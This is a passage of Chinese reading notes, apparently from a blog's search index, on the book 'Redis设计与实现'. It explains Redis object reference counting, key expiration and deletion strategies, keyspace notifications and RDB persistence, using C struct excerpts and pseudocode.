会先检查输入键的类型是否正确，然后再决定是否执行给定的命令。\n类型特定命令所进行的类型检查是通过redisObject结构的type属性来实现的：\n\n在执行一个类型特定命令之前，服务器会先检查输入数据库键的值对象是否为执行命令所需的类型，如果是的话，服务器就对键执行指定的命令；\n否则，服务器将拒绝执行命令，并向客户端返回一个类型错误。\n\n多态命令的实现Redis除了会根据值对象的类型来判断键是否能够执行指定命令之外，还会根据值对象的编码方式，选择正确的命令实现代码来执行命令。\n比如，列表对象有ziplist和linkedlist两种编码可用，其中前者使用压缩列表API来实现列表命令，而后者则使用双端链表API来实现列表命令。如果我们对一个键执行LLEN命令，那么服务器除了要确保执行命令的是列表键之外，还需要根据键的值对象所使用的编码来选择正确的LLEN命令实现：\n\n如果列表对象的编码为ziplist，那么说明列表对象的实现为压缩列表，程序将使用ziplistLen函数来返回列表的长度；\n如果列表对象的编码为linkedlist，那么说明列表对象的实现为双端链表，程序将使用listLength函数来返回双端链表的长度；\n\n借用面向对象方面的术语来说，我们可以认为LLEN命令是多态（polymorphism）的，只要执行LLEN命令的是列表键，那么无论值对象使用的是ziplist编码还是linkedlist编码，命令都可以正常执行。实际上，我们也可以将DEL、EXPIRE、TYPE等命令也称为多态命令，因为无论输入的键是什么类型，这些命令都可以正确地执行。DEL、EXPIRE等命令和LLEN等命令的区别在于，前者是基于类型的多态——一个命令可以同时用于处理多种不同类型的键，而后者是基于编码的多态——一个命令可以同时用于处理多种不同编码。\n内存回收因为C语言并不具备自动内存回收功能，所以Redis在自己的对象系统中构建了一个引用计数（reference counting）技术实现的内存回收机制。通过这一机制，程序可以通过跟踪对象的引用计数信息，在适当的时候自动释放对象并进行内存回收。\n每个对象的引用计数信息由redisObject结构的refcount属性记录：\ntypedef struct redisObject &#123;    // ...    // 引用计数    int refcount;    // ...&#125; robj;\n\n对象的引用计数信息会随着对象的使用状态而不断变化：\n\n在创建一个新对象时，引用计数的值会被初始化为1；\n当对象被一个新程序使用时，它的引用计数值会被增一；\n当对象不再被一个程序使用时，它的引用计数值会被减一；\n当对象的引用计数值变为0时，对象所占用的内存会被释放。\n\n下面列出了修改对象引用计数的API，这些API分别用于增加、减少、重置对象的引用计数。\n\n\n\n函数\n作用\n\n\n\nincrRefCount\n将对象的引用计数值增加 1。\n\n\ndecrRefCount\n将对象的引用计数值减少 1。当对象的引用计数值等于 0 时，释放对象。\n\n\nresetRefCount\n将对象的引用计数值设置为指定值，通常在需要重置引用计数时使用。\n\n\n对象共享除了用于实现引用计数内存回收机制之外，对象的引用计数属性还带有对象共享的作用。\n举个例子，假设键A创建了一个包含整数值100的字符串对象作为值对象。如果这时键B也要创建一个同样保存了整数值100的字符串对象作为值对象，那么服务器有以下两种做法：\n\n为键B新创建一个包含整数值100的字符串对象；\n让键A和键B共享同一个字符串对象；\n\n以上两种方法很明显是第二种方法更节约内存。在Redis中，让多个键共享同一个值对象需要执行以下两个步骤：\n\n将数据库键的值指针指向一个现有的值对象；\n将被共享的值对象的引用计数增一。\n\n目前来说，Redis会在初始化服务器时，创建一万个字符串对象，这些对象包含了从0到9999的所有整数值，当服务器需要用到值为0到9999的字符串对象时，服务器就会使用这些共享对象，而不是新创建对象。创建共享字符串对象的数量可以通过修改redis.h&#x2F;REDIS_SHARED_INTEGERS常量来修改。可以使用OBJECT REFCOUNT命令查看对象的引用计数。\n另外，这些共享对象不单单只有字符串键可以使用，那些在数据结构中嵌套了字符串对象的对象（linkedlist编码的列表对象、hashtable编码的哈希对象、hashtable编码的集合对象，以及zset编码的有序集合对象）都可以使用这些共享对象。\n为什么Redis不共享包含字符串的对象？\n当服务器考虑将一个共享对象设置为键的值对象时，程序需要先检查给定的共享对象和键想创建的目标对象是否完全相同，只有在共享对象和目标对象完全相同的情况下，程序才会将共享对象用作键的值对象。而一个共享对象保存的值越复杂，验证共享对象和目标对象是否相同所需的复杂度就会越高，消耗的CPU时间也会越多：\n\n如果共享对象是保存整数值的字符串对象，那么验证操作的复杂度为O（1）；\n如果共享对象是保存字符串值的字符串对象，那么验证操作的复杂度为O（N）；\n如果共享对象是包含了多个值（或者对象的）对象，比如列表对象或者哈希对象，那么验证操作的复杂度将会是O（N 2）。\n\n因此，尽管共享更复杂的对象可以节约更多的内存，但受到CPU时间的限制，Redis只对包含整数值的字符串对象进行共享。\n对象的空转时长除了前面介绍过的type、encoding、ptr和refcount四个属性之外，redisObject结构包含的最后一个属性为lru属性，该属性记录了对象最后一次被命令程序访问的时间：\ntypedef struct redisObject &#123;    // ...    unsigned lru:22;    // ...&#125; robj;\n\nOBJECT IDLETIME命令可以打印出给定键的空转时长，这一空转时长就是通过将当前时间减去键的值对象的lru时间计算得出的：\nOBJECT IDLETIME命令的实现是特殊的，这个命令在访问键的值对象时，不会修改值对象的lru属性。除了可以被OBJECT IDLETIME命令打印出来之外，键的空转时长还有另外一项作用：如果服务器打开了maxmemory选项，并且服务器用于回收内存的算法为 volatile-lru 或者 allkeys-lru，那么当服务器占用的内存数超过了 maxmemory 选项所设置的上限值时，空转时长较高的那部分键会优先被服务器释放，从而回收内存。\n配置文件的 maxmemory 选项和 maxmemory-policy 选项的说明介绍了关于这方面的更多信息。\n","categories":["读书笔记"],"tags":["Redis","数据库","《Redis设计与实现》"]},{"title":"《Redis设计与实现》读书笔记-单机数据库的实现","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ARedis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%9E%E7%8E%B0/","content":"第九章 - 数据库服务器中的数据库Redis服务器将所有数据库都保存在服务器状态redis.h&#x2F;redisServer结构的db数组中，db数组的每个项都是一个redis.h&#x2F;redisDb结构，每个redisDb结构代表一个数据库：\nstruct redisServer &#123;    // ...    // 一个数组，保存着服务器中的所有数据库    redisDb *db;    // ...&#125;;\n\n在初始化服务器时，程序会根据服务器状态的dbnum属性来决定应该创建多少个数据库：\nstruct redisServer &#123;    // ...    // 服务器的数据库数量    int dbnum;    // ...&#125;;\n\ndbnum属性的值由服务器配置的database选项决定，默认情况下，该选项的值为16，所以Redis服务器默认会创建16个数据库。\n切换数据库每个Redis客户端都有自己的目标数据库，每当客户端执行数据库写命令或者数据库读命令的时候，目标数据库就会成为这些命令的操作对象。默认情况下，Redis客户端的目标数据库为0号数据库，但客户端可以通过执行SELECT命令来切换目标数据库。\n在服务器内部，客户端状态redisClient结构的db属性记录了客户端当前的目标数据库，这个属性是一个指向redisDb结构的指针：\ntypedef struct redisClient &#123;    // ...    // 记录客户端当前正在使用的数据库    redisDb *db;    // ...&#125; redisClient;\n\nredisClient.db指针指向redisServer.db数组的其中一个元素，而被指向的元素就是客户端的目标数据库。通过修改redisClient.db指针，让它指向服务器中的不同数据库，从而实现切换目标数据库的功能——这就是SELECT命令的实现原理。\n数据库键空间Redis是一个键值对（key-value pair）数据库服务器，服务器中的每个数据库都由一个redis.h&#x2F;redisDb结构表示。其中，redisDb结构的dict字典保存了数据库中的所有键值对，我们将这个字典称为键空间（key space）：\ntypedef struct redisDb &#123;    // ...    // 数据库键空间，保存着数据库中的所有键值对    dict *dict;    // ...&#125; redisDb;\n\n键空间和用户所见的数据库是直接对应的：\n\n键空间的键也就是数据库的键，每个键都是一个字符串对象。\n键空间的值也就是数据库的值，每个值可以是字符串对象、列表对象、哈希表对象、集合对象和有序集合对象中的任意一种Redis对象。\n\n因为数据库的键空间是一个字典，所以所有针对数据库的操作，比如添加一个键值对到数据库，或者从数据库中删除一个键值对，又或者在数据库中获取某个键值对等，实际上都是通过对键空间字典进行操作来实现的。除了这些针对之外，还有很多针对数据库本身的Redis命令，也可以通过对键空间的操作来实现。比如用于清空整个数据库的FLUSHDB命令，就是通过删除键空间中的所有键值对来实现的。\n读写键空间时的维护操作当使用Redis命令对数据库进行读写时，服务器不仅会对键空间执行指定的读写操作，还会执行一些额外的维护操作，其中包括：\n\n在读取一个键之后（读操作和写操作都要对键进行读取），服务器会根据键是否存在来更新服务器的键空间命中（hit）次数或键空间不命中（miss）次数，这两个值可以在INFO stats命令的keyspace_hits属性和keyspace_misses属性中查看。\n在读取一个键之后，服务器会更新键的LRU（最后一次使用）时间，这个值可以用于计算键的闲置时间，使用OBJECT idletime命令可以查看键key的闲置时间。\n如果服务器在读取一个键时发现该键已经过期，那么服务器会先删除这个过期键，然后才执行余下的其他操作。\n如果有客户端使用WATCH命令监视了某个键，那么服务器在对被监视的键进行修改之后，会将这个键标记为脏（dirty），从而让事务程序注意到这个键已经被修改过。\n服务器每次修改一个键之后，都会对脏（dirty）键计数器的值增1，这个计数器会触发服务器的持久化以及复制操作。\n如果服务器开启了数据库通知功能，那么在对键进行修改之后，服务器将按配置发送相应的数据库通知。\n\n设置键的生存时间或过期时间通过EXPIRE命令或者PEXPIRE命令，客户端可以以秒或者毫秒精度为数据库中的某个键设置生存时间（Time To Live，TTL），在经过指定的秒数或者毫秒数之后，服务器就会自动删除生存时间为0的键。\nSETEX命令可以在设置一个字符串键的同时为键设置过期时间（只能用于字符串键）。与EXPIRE命令和PEXPIRE命令类似，客户端可以通过EXPIREAT命令或PEXPIREAT命令，以秒或者毫秒精度给数据库中的某个键设置过期时间（expire time）。过期时间是一个UNIX时间戳，当键的过期时间来临时，服务器就会自动从数据库中删除这个键。\n过期时间是一个UNIX时间戳，当键的过期时间来临时，服务器就会自动从数据库中删除这个键。\n设置过期时间Redis有四个不同的命令可以用于设置键的生存时间（键可以存在多久）或过期时间（键什么时候会被删除）：\n\nEXPIRE &lt;key&gt; &lt;ttl&gt;命令用于将键key的生存时间设置为ttl秒。\nPEXPIRE &lt;key&gt; &lt;ttl&gt;命令用于将键key的生存时间设置为ttl毫秒。\nEXPIREAT &lt;key&gt; &lt;timestamp&gt;命令用于将键key的过期时间设置为timestamp所指定的秒数时间戳。\nPEXPIREAT &lt;key&gt; &lt;timestamp&gt;命令用于将键key的过期时间设置为timestamp所指定的毫秒数时间戳。\n\n虽然有多种不同单位和不同形式的设置命令，但实际上EXPIRE、PEXPIRE、EXPIREAT三个命令都是使用PEXPIREAT命令来实现的：无论客户端执行的是以上四个命令中的哪一个，经过转换之后，最终的执行效果都和执行PEXPIREAT命令一样。\n保存过期时间redisDb结构的expires字典保存了数据库中所有键的过期时间，我们称这个字典为过期字典：\n\n过期字典的键是一个指针，这个指针指向键空间中的某个键对象（也即是某个数据库键）。\n过期字典的值是一个long long类型的整数，这个整数保存了键所指向的数据库键的过期时间——一个毫秒精度的UNIX时间戳。\n\ntypedef struct redisDb &#123;    // ...    // 过期字典，保存着键的过期时间    dict *expires;    // ...&#125; redisDb;\n\n以下是PEXPIREAT命令的伪代码定义：\ndef PEXPIREAT(key, expire_time_in_ms):    # 如果给定的键不存在于键空间，那么不能设置过期时间    if key not in redisDb.dict:        return 0    # 在过期字典中关联键和过期时间    redisDb.expires[key] = expire_time_in_ms    # 过期时间设置成功    return 1\n\n移除过期时间PERSIST命令可以移除一个键的过期时间。PERSIST命令就是PEXPIREAT命令的反操作：PERSIST命令在过期字典中查找给定的键，并解除键和值（过期时间）在过期字典中的关联。\n以下是PERSIST命令的伪代码定义：\ndef PERSIST(key):    # 如果键不存在，或者键没有设置过期时间，那么直接返回    if key not in redisDb.expires:        return 0    # 移除过期字典中给定键的键值对关联    redisDb.expires.remove(key)    # 键的过期时间移除成功    return 1\n\n计算并返回剩余生存时间TTL命令以秒为单位返回键的剩余生存时间，而PTTL命令则以毫秒为单位返回键的剩余生存时间。\nTTL和PTTL两个命令都是通过计算键的过期时间和当前时间之间的差来实现的，以下是这两个命令的伪代码实现：\ndef PTTL(key):    # 键不存在于数据库    if key not in redisDb.dict:        return -2    # 尝试取得键的过期时间    # 如果键没有设置过期时间，那么 expire_time_in_ms 将为 None    expire_time_in_ms = redisDb.expires.get(key)    # 键没有设置过期时间    if expire_time_in_ms is None:        return -1    # 获得当前时间    now_ms = get_current_unix_timestamp_in_ms()    # 过期时间减去当前时间，得出的差就是键的剩余生存时间    return (expire_time_in_ms - now_ms)def TTL(key):    # 获取以毫秒为单位的剩余生存时间    ttl_in_ms = PTTL(key)    if ttl_in_ms &lt; 0:        # 处理返回值为-2和-1的情况        return ttl_in_ms    else:        # 将毫秒转换为秒        return ms_to_sec(ttl_in_ms)\n\n过期键的判定通过过期字典，程序可以用以下步骤检查一个给定键是否过期：\n\n检查给定键是否存在于过期字典：如果存在，那么取得键的过期时间。\n检查当前UNIX时间戳是否大于键的过期时间：如果是的话，那么键已经过期；否则的话，键未过期。\n\n可以用伪代码来描述这一过程：\ndef is_expired(key):    # 取得键的过期时间    expire_time_in_ms = redisDb.expires.get(key)    # 键没有设置过期时间    if expire_time_in_ms is None:        return False    # 取得当前时间的UNIX时间戳    now_ms = get_current_unix_timestamp_in_ms()    # 检查当前时间是否大于键的过期时间    if now_ms &gt; expire_time_in_ms:        # 是，键已经过期        return True    else:        # 否，键未过期        return False\n\n实现过期键判定的另一种方法是使用TTL命令或者PTTL命令，比如说，如果对某个键执行TTL命令，并且命令返回的值大于等于0，那么说明该键未过期。在实际中，Redis检查键是否过期的方法和is_expired函数所描述的方法一致，因为直接访问字典比执行一个命令稍微快一些。\n过期键删除策略如果一个键过期了，那么它什么时候会被删除呢？\n这个问题有三种可能的答案，它们分别代表了三种不同的删除策略：\n\n定时删除：在设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。\n惰性删除：放任键过期不管，但是每次从键空间中获取键时，都检查取得的键是否过期，如果过期的话，就删除该键；如果没有过期，就返回该键。\n定期删除：每隔一段时间，程序就对数据库进行一次检查，删除里面的过期键。至于要删除多少过期键，以及要检查多少个数据库，则由算法决定。\n\n在这三种策略中，第一种和第三种为主动删除策略，而第二种则为被动删除策略。\n定时删除定时删除策略对内存是最友好的：通过使用定时器，定时删除策略可以保证过期键会尽可能快地被删除，并释放过期键所占用的内存。另一方面，定时删除策略的缺点是，它对CPU时间是最不友好的：在过期键比较多的情况下，删除过期键这一行为可能会占用相当一部分CPU时间，在内存不紧张但是CPU时间非常紧张的情况下，将CPU时间用在删除和当前任务无关的过期键上，无疑会对服务器的响应时间和吞吐量造成影响。\n例如，如果正有大量的命令请求在等待服务器处理，并且服务器当前不缺少内存，那么服务器应该优先将CPU时间用在处理客户端的命令请求上面，而不是用在删除过期键上面。除此之外，创建一个定时器需要用到Redis服务器中的时间事件，而当前时间事件的实现方式——无序链表，查找一个事件的时间复杂度为O（N）——并不能高效地处理大量时间事件。因此，要让服务器创建大量的定时器，从而实现定时删除策略，在现阶段来说并不现实。\n惰性删除惰性删除策略对CPU时间来说是最友好的：程序只会在取出键时才对键进行过期检查，这可以保证删除过期键的操作只会在非做不可的情况下进行，并且删除的目标仅限于当前处理的键，这个策略不会在删除其他无关的过期键上花费任何CPU时间。惰性删除策略的缺点是，它对内存是最不友好的：如果一个键已经过期，而这个键又仍然保留在数据库中，那么只要这个过期键不被删除，它所占用的内存就不会释放。在使用惰性删除策略时，如果数据库中有非常多的过期键，而这些过期键又恰好没有被访问到的话，那么它们也许永远也不会被删除（除非用户手动执行FLUSHDB），我们甚至可以将这种情况看作是一种内存泄漏——无用的垃圾数据占用了大量的内存，而服务器却不会自己去释放它们，这对于运行状态非常依赖于内存的Redis服务器来说，肯定不是一个好消息。\n举个例子，对于一些和时间有关的数据，比如日志（log），在某个时间点之后，对它们的访问就会大大减少，甚至不再访问，如果这类过期数据大量地积压在数据库中，用户以为服务器已经自动将它们删除了，但实际上这些键仍然存在，而且键所占用的内存也没有释放，那么造成的后果肯定是非常严重的。\n定期删除从上面对定时删除和惰性删除的讨论来看，这两种删除方式在单一使用时都有明显的缺陷：\n\n惰性删除浪费太多内存，有内存泄漏的危险。\n定时删除占用太多CPU时间，影响服务器的响应时间和吞吐量。\n\n定期删除策略是前两种策略的一种整合和折中：\n\n定期删除策略每隔一段时间执行一次删除过期键操作，并通过限制删除操作执行的时长和频率来减少删除操作对CPU时间的影响。\n除此之外，通过定期删除过期键，定期删除策略有效地减少了因为过期键而带来的内存浪费。\n\n定期删除策略的难点是确定删除操作执行的时长和频率：\n\n如果删除操作执行得太频繁，或者执行的时间太长，定期删除策略就会退化成定时删除策略，以至于将CPU时间过多地消耗在删除过期键上面。\n如果删除操作执行得太少，或者执行的时间太短，定期删除策略又会和惰性删除策略一样，出现浪费内存的情况。\n\n因此，如果采用定期删除策略的话，服务器必须根据情况，合理地设置删除操作的执行时长和执行频率。任何单一的方案都有各自的优势和不足，因此，通常情况都是将不同的方案组合，以尽可能的利用他们的优势，降低劣势。同时可以根据实际业务需要、服务器性能等实际情况进行调整。\nRedis的过期键删除策略Redis服务器实际使用的是惰性删除和定期删除两种策略：通过配合使用这两种删除策略，服务器可以很好地在合理使用CPU时间和避免浪费内存空间之间取得平衡。\n惰性删除策略的实现过期键的惰性删除策略由db.c&#x2F;expireIfNeeded函数实现，所有读写数据库的Redis命令在执行之前都会调用expireIfNeeded函数对输入键进行检查：\n\n如果输入键已经过期，那么expireIfNeeded函数将输入键从数据库中删除。\n如果输入键未过期，那么expireIfNeeded函数不做动作。\n\nexpireIfNeeded函数就像一个过滤器，它可以在命令真正执行之前，过滤掉过期的输入键，从而避免命令接触到过期键。\n另外，因为每个被访问的键都可能因为过期而被expireIfNeeded函数删除，所以每个命令的实现函数都必须能同时处理键存在以及键不存在这两种情况：\n\n当键存在时，命令按照键存在的情况执行。\n当键不存在或者键因为过期而被expireIfNeeded函数删除时，命令按照键不存在的情况执行。\n\n定期删除策略的实现过期键的定期删除策略由redis.c&#x2F;activeExpireCycle函数实现，每当Redis的服务器周期性操作redis.c&#x2F;serverCron函数执行时，activeExpireCycle函数就会被调用，它在规定的时间内，分多次遍历服务器中的各个数据库，从数据库的expires字典中随机检查一部分键的过期时间，并删除其中的过期键。\n整个过程可以用伪代码描述如下：\n# 默认每次检查的数据库数量DEFAULT_DB_NUMBERS = 16# 默认每个数据库检查的键数量DEFAULT_KEY_NUMBERS = 20# 全局变量，记录检查进度current_db = 0def activeExpireCycle():    # 初始化要检查的数据库数量    # 如果服务器的数据库数量比 DEFAULT_DB_NUMBERS 要小    # 那么以服务器的数据库数量为准    if server.dbnum &lt; DEFAULT_DB_NUMBERS:        db_numbers = server.dbnum    else:        db_numbers = DEFAULT_DB_NUMBERS    # 遍历各个数据库    for i in range(db_numbers):        # 如果current_db的值等于服务器的数据库数量        # 这表示检查程序已经遍历了服务器的所有数据库一次        # 将current_db重置为0，开始新的一轮遍历        if current_db == server.dbnum:            current_db = 0        # 获取当前要处理的数据库        redisDb = server.db[current_db]        # 将数据库索引增1，指向下一个要处理的数据库        current_db += 1        # 检查数据库键        for j in range(DEFAULT_KEY_NUMBERS):            # 如果数据库中没有一个键带有过期时间，那么跳过这个数据库            if redisDb.expires.size() == 0: break            # 随机获取一个带有过期时间的键            key_with_ttl = redisDb.expires.get_random_key()            # 检查键是否过期，如果过期就删除它            if is_expired(key_with_ttl):                delete_key(key_with_ttl)            # 已达到时间上限，停止处理            if reach_time_limit(): return\n\nactiveExpireCycle函数的工作模式可以总结如下：\n\n函数每次运行时，都从一定数量的数据库中取出一定数量的随机键进行检查，并删除其中的过期键。\n全局变量current_db会记录当前activeExpireCycle函数检查的进度，并在下一次activeExpireCycle函数调用时，接着上一次的进度进行处理。比如说，如果当前activeExpireCycle函数在遍历10号数据库时返回了，那么下次activeExpireCycle函数执行时，将从11号数据库开始查找并删除过期键。\n随着activeExpireCycle函数的不断执行，服务器中的所有数据库都会被检查一遍，这时函数将current_db变量重置为0，然后再次开始新一轮的检查工作。\n\nAOF、RDB和复制功能对过期键的处理看看过期键对Redis服务器中其他模块的影响，看看RDB持久化功能、AOF持久化功能以及复制功能是如何处理数据库中的过期键的。\n生成RDB文件在执行SAVE命令或者BGSAVE命令创建一个新的RDB文件时，程序会对数据库中的键进行检查，已过期的键不会被保存到新创建的RDB文件中。数据库中包含过期键不会对生成新的RDB文件造成影响。\n载入RDB文件在启动Redis服务器时，如果服务器开启了RDB功能，那么服务器将对RDB文件进行载入：\n\n如果服务器以主服务器模式运行，那么在载入RDB文件时，程序会对文件中保存的键进行检查，未过期的键会被载入到数据库中，而过期键则会被忽略，所以过期键对载入RDB文件的主服务器不会造成影响。\n如果服务器以从服务器模式运行，那么在载入RDB文件时，文件中保存的所有键，不论是否过期，都会被载入到数据库中。不过，因为主从服务器在进行数据同步的时候，从服务器的数据库就会被清空，所以一般来讲，过期键对载入RDB文件的从服务器也不会造成影响。\n\nAOF文件写入当服务器以AOF持久化模式运行时，如果数据库中的某个键已经过期，但它还没有被惰性删除或者定期删除，那么AOF文件不会因为这个过期键而产生任何影响。当过期键被惰性删除或者定期删除之后，程序会向AOF文件追加（append）一条DEL命令，来显式地记录该键已被删除。\n举个例子，如果客户端使用GET message命令，试图访问过期的message键，那么服务器将执行以下三个动作：\n\n从数据库中删除message键。\n追加一条DEL message命令到AOF文件。\n向执行GET命令的客户端返回空回复。\n\nAOF重写和生成RDB文件时类似，在执行AOF重写的过程中，程序会对数据库中的键进行检查，已过期的键不会被保存到重写后的AOF文件中。数据库中包含过期键不会对AOF重写造成影响。\n复制当服务器运行在复制模式下时，从服务器的过期键删除动作由主服务器控制：\n\n主服务器在删除一个过期键之后，会显式地向所有从服务器发送一个DEL命令，告知从服务器删除这个过期键。\n从服务器在执行客户端发送的读命令时，即使碰到过期键也不会将过期键删除，而是继续像处理未过期的键一样来处理过期键。\n从服务器只有在接到主服务器发来的DEL命令之后，才会删除过期键。\n\n通过由主服务器来控制从服务器统一地删除过期键，可以保证主从服务器数据的一致性，也正是因为这个原因，当一个过期键仍然存在于主服务器的数据库时，这个过期键在从服务器里的复制品也会继续存在。\n在主从复制中，数据一致性至关重要。 主从服务器常用于读写分离，允许从服务器延迟一定的状态同步来提升读性能。\n数据库通知数据库通知是Redis 2.8版本新增加的功能，这个功能可以让客户端通过订阅给定的频道或者模式，来获知数据库中键的变化，以及数据库中命令的执行情况。\n关注“某个键执行了什么命令”的通知称为键空间通知（key-space notification），除此之外，还有另一类称为键事件通知（key-event notification） 的通知，它们关注的是“某个命令被什么键执行了”。\n服务器配置的 notify-keyspace-events 选项决定了服务器所发送通知的类型：\nK     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...$     String commandsl     List commandss     Set commandsh     Hash commandsz     Sorted set commandst     Stream commandsd     Module key type eventsx     Expired events (events generated every time a key expires)e     Evicted events (events generated when a key is evicted for maxmemory)m     Key miss events (events generated when a key that doesn&#x27;t exist is accessed)n     New key events (Note: not included in the &#x27;A&#x27; class)A     Alias for &quot;g$lshztxed&quot;, so that the &quot;AKE&quot; string means all the events except &quot;m&quot; and &quot;n&quot;.\n\n更多设置信息，可以参考官方文档：Redis keyspace notifications。\n发送通知发送数据库通知的功能是由notify.c&#x2F;notifyKeyspaceEvent函数实现的： void notifyKeyspaceEvent(int type,char *event,robj *key,int dbid);\n函数的 type 参数是当前想要发送的通知的类型，程序会根据这个值来判断通知是否就是服务器配置 notify-keyspace-events 选项所选定的通知类型，从而决定是否发送通知。event、keys 和 dbid 分别是事件的名称、产生事件的键，以及产生事件的数据库号码，函数会根据 type 参数以及这三个参数来构建事件通知的内容，以及接收通知的频道名。每当一个Redis命令需要发送数据库通知的时候，该命令的实现函数就会调用 notify-KeyspaceEvent 函数，并向函数传递传递该命令所引发的事件的相关信息。\n发送通知的实现以下是notifyKeyspaceEvent函数的伪代码实现：\ndef notifyKeyspaceEvent(type, event, key, dbid):    # 如果给定的通知不是服务器允许发送的通知，那么直接返回    if not (server.notify_keyspace_events &amp; type):        return    # 发送键空间通知    if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYSPACE:        # 将通知发送给频道__keyspace@&lt;dbid&gt;__:&lt;key&gt;        # 内容为键所发生的事件 &lt;event&gt;        # 构建频道名字        chan = &quot;__keyspace@&#123;dbid&#125;__:&#123;key&#125;&quot;.format(dbid=dbid, key=key)        # 发送通知        pubsubPublishMessage(chan, event)    # 发送键事件通知    if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYEVENT:        # 将通知发送给频道__keyevent@&lt;dbid&gt;__:&lt;event&gt;        # 内容为发生事件的键 &lt;key&gt;        # 构建频道名字        chan = &quot;__keyevent@&#123;dbid&#125;__:&#123;event&#125;&quot;.format(dbid=dbid, event=event)        # 发送通知        pubsubPublishMessage(chan, key)\n\nnotifyKeyspaceEvent 函数执行以下操作：\n\nserver.notify_keyspace_events 属性就是服务器配置 notify-keyspace-events 选项所设置的值，如果给定的通知类型type不是服务器允许发送的通知类型，那么函数会直接返回，不做任何动作。\n如果给定的通知是服务器允许发送的通知，那么下一步函数会检测服务器是否允许发送键空间通知，如果允许的话，程序就会构建并发送事件通知。\n最后，函数检测服务器是否允许发送键事件通知，如果允许的话，程序就会构建并发送事件通知。\n\n另外，pubsubPublishMessage 函数是 PUBLISH 命令的实现函数，执行这个函数等同于执行PUBLISH命令，订阅数据库通知的客户端收到的信息就是由这个函数发出的。\n第十章 - RDB持久化Redis是一个键值对数据库服务器，服务器中通常包含着任意个非空数据库，而每个非空数据库中又可以包含任意个键值对，为了方便起见，我们将服务器中的非空数据库以及它们的键值对统称为数据库状态。\n下面展示了一个包含三个非空数据库的Redis服务器，这三个数据库以及数据库中的键值对就是该服务器的数据库状态。\n\n因为Redis是内存数据库，它将自己的数据库状态储存在内存里面，所以如果不想办法将储存在内存中的数据库状态保存到磁盘里面，那么一旦服务器进程退出，服务器中的数据库状态也会消失不见。为了解决这个问题，Redis提供了RDB持久化功能，这个功能可以将Redis在内存中的数据库状态保存到磁盘里面，避免数据意外丢失。\nRDB持久化既可以手动执行，也可以根据服务器配置选项定期执行，该功能可以将某个时间点上的数据库状态保存到一个RDB文件中。RDB持久化功能所生成的RDB文件是一个经过压缩的二进制文件，通过该文件可以还原生成RDB文件时的数据库状态。\n因为RDB文件是保存在硬盘里面的，所以即使Redis服务器进程退出，甚至运行Redis服务器的计算机停机，但只要RDB文件仍然存在，Redis服务器就可以用它来还原数据库状态。\nRDB文件的创建与载入有两个Redis命令可以用于生成RDB文件，一个是SAVE，另一个是BGSAVE。\nSAVE命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在服务器进程阻塞期间，服务器不能处理任何命令请求。和SAVE命令直接阻塞服务器进程的做法不同，BGSAVE命令会派生出一个子进程，然后由子进程负责创建RDB文件，服务器进程（父进程）继续处理命令请求。\n创建RDB文件的实际工作由rdb.c&#x2F;rdbSave函数完成，SAVE命令和BGSAVE命令会以不同的方式调用这个函数，通过以下伪代码可以明显地看出这两个命令之间的区别：\ndef SAVE():    # 创建RDB文件    rdbSave()def BGSAVE():    # 创建子进程    pid = fork()    if pid == 0:        # 子进程负责创建RDB文件        rdbSave()        # 完成之后向父进程发送信号        signal_parent()    elif pid &gt; 0:        # 父进程继续处理命令请求，并通过轮询等待子进程的信号        handle_request_and_wait_signal()    else:        # 处理出错情况        handle_fork_error()\n\n和使用SAVE命令或者BGSAVE命令创建RDB文件不同，RDB文件的载入工作是在服务器启动时自动执行的，所以Redis并没有专门用于载入RDB文件的命令，只要Redis服务器在启动时检测到RDB文件存在，它就会自动载入RDB文件。\n另外值得一提的是，因为AOF文件的更新频率通常比RDB文件的更新频率高，所以：\n\n如果服务器开启了AOF持久化功能，那么服务器会优先使用AOF文件来还原数据库状态。\n只有在AOF持久化功能处于关闭状态时，服务器才会使用RDB文件来还原数据库状态。\n\nSAVE命令执行时的服务器状态前面提到过，当SAVE命令执行时，Redis服务器会被阻塞，所以当SAVE命令正在执行时，客户端发送的所有命令请求都会被拒绝。只有在服务器执行完SAVE命令、重新开始接受命令请求之后，客户端发送的命令才会被处理。\nBGSAVE命令执行时的服务器状态因为 BGSAVE 命令的保存工作是由子进程执行的，所以在子进程创建 RDB 文件的过程中， Redis 服务器仍然可以继续处理客户端的命令请求。但是，在 BGSAVE 命令执行期间，服务器处理 SAVE 、 BGSAVE 、 BGREWRITEAOF 三个命令的方式会和平时有所不同。\n首先，在 BGSAVE 命令执行期间，客户端发送的 SAVE 命令会被服务器拒绝，服务器禁止 SAVE 命令和 BGSAVE 命令同时执行是为了避免父进程（服务器进程）和子进程同时执行两个 rdbSave 调用，防止产生竞争条件。其次，在 BGSAVE 命令执行期间，客户端发送的 BGSAVE 命令会被服务器拒绝，因为同时执行两个 BGSAVE 命令也会产生竞争条件。最后， BGREWRITEAOF 和 BGSAVE 两个命令不能同时执行：\n\n如果 BGSAVE 命令正在执行，那么客户端发送的 BGREWRITEAOF 命令会被延迟到 BGSAVE 命令执行完毕之后执行。\n如果 BGREWRITEAOF 命令正在执行，那么客户端发送的 BGSAVE 命令会被服务器拒绝。\n\n因为 BGREWRITEAOF 和 BGSAVE 